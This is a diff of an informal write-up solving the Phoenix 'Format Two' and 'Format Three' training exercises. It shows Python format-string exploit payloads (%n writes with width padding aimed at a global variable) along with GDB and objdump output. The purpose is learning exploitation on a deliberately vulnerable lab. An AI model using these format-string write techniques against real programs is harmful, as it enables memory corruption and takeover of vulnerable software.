@@ -156,20 +156,23 @@ payload += b'%12$n'
 open('payload_f2','wb').write(payload)
 ```
 And then inside GDB and pausing at main+133 we see:
+```
 gef➤  x/12w $ebx+0x44
 0x5655900c <changeme>:	0x10	0x0	0x0	0x0
 0x5655901c:	0x0	0x0	0x0	0x0
 0x5655902c:	0x0	0x0	0x0	0x0
-
+```
 **We changed it!** 
+```
 �UV������������Well done, the 'changeme' variable has been changed correctly!
 [Inferior 1 (process 1964008) exited normally]
-
+```
 # Format Three
 Okay so lets find the global:
+```
 $ objdump -t f3 | grep changeme
 0000400c g     O .bss	00000004              changeme
-
+```
 Great same location. What about the code being exploited:
 ```C
 int changeme;
@@ -199,13 +202,15 @@ int main(int argc, char **argv) {
 }
 ```
 so we need to change the value of the global to specifically: b'ExEd' this time..
-
+```python
 payload = p32(0x5655900c) # Address of changeme at runtime using GDB
-payload += b'A'*4000
+payload += b'A'*4000 # we have a HUGE 4096 size buffer this time
 payload += b'%12$n'
 open('payload_f3','wb').write(payload)
+```
 
-
+And then trying it in GDB what do we get
+```
 gef➤  r $(cat payload_f3 )
 Starting program: /home/xxxx/phoenix/formats/f3 $(cat payload_f3 )
 [Thread debugging using libthread_db enabled]
@@ -220,31 +225,31 @@ Okay interesting so the size of the input seems to be what is overwriting change
 but we cant send in 0x64457845 characters thats insane... or maybe we can send something that will expand INTO that many characters? 
 
  Better luck next time - got 0x00000fa4, wanted 0x64457845!
- 
- 
- 
+ ```
+ Huh... so the hex value is the number of bytes our input expands to.. well we can use the trick from earlier to expand small format string into many more bytes, so lets try that??
+```python
 payload = p32(0x5655900c) # Address of changeme at runtime using GDB
 payload += b'%64457845x'
 payload += b'%12$n'
 open('payload_f3','wb').write(payload)
+```
 
-
-
-**HOLY SHIT LOL** 
-
+**HOLY SH*T LOL GDB GOES INSANE** 
+```
 0Better luck next time - got 0x03d78c79, wanted 0x64457845!
 [Inferior 1 (process 1964189) exited normally]
+```
+HMMMMMMMMMMMM......almost but not quite.
 
-almost but not quite lol that like exploded gdb tho
-
-OH IM SO DUMB its in hex so we have to send that value converted to an int and subtract 4
+*OH IM SO DUMB* its in hex so we have to send that value converted to an int and subtract 4
 (because size of address we're overwriting is 4
 
+```python
 payload = p32(0x5655900c) # Address of changeme at runtime using GDB
 payload += b'%1682274369x'
 payload += b'%12$n'
 open('payload_f3','wb').write(payload)
-
-0Well done, the 'changeme' variable has been changed correctly!
-
+```
+AND VOILA:
+``` 0Well done, the 'changeme' variable has been changed correctly! ```
 **YAY XDDDDDDD**
